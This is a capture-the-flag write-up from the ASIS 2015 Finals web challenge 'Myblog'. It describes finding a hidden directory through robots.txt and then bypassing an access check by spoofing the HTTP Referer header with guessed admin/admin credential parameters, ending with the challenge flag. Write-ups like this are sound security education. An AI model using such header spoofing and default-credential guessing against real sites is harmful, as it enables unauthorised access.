---
layout: post
title: "ASIS 2015 Finals: (web150) Myblog"
modified: 2015-10-15
tags: asis asis2015finals web
---

*This challenge was solved by and the write up was written by one of my teammates, nguyen*

<http://myblog.asis-ctf.ir:8088/robots.txt>
{% highlight text %}
User-agent: *
Disallow: /myblog_private_dir3ct0ry
{% endhighlight %}

From printing feature you can see the page by sending the correct referer header.
Referer: <http://myblog.asis-ctf.ir:8088/myblog_private_dir3ct0ry/>

{% highlight http %}
GET /printpage.php?id=2417648298 HTTP/1.1
Host: myblog.asis-ctf.ir:8088
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://myblog.asis-ctf.ir:8088/myblog_private_dir3ct0ry/?username=admin&password=admin
Connection: keep-alive
{% endhighlight %}

After some combinations of commons params name I decided to send them all

Referer: http://myblog.asis-ctf.ir:8088/myblog_private_dir3ct0ry/?username=admin&password=admin&login=admin&user=admin

And I got this pdf has flag:
{% highlight text %}
ASIS{9c846eab5200c267cb593437780caa4d}
{% endhighlight %}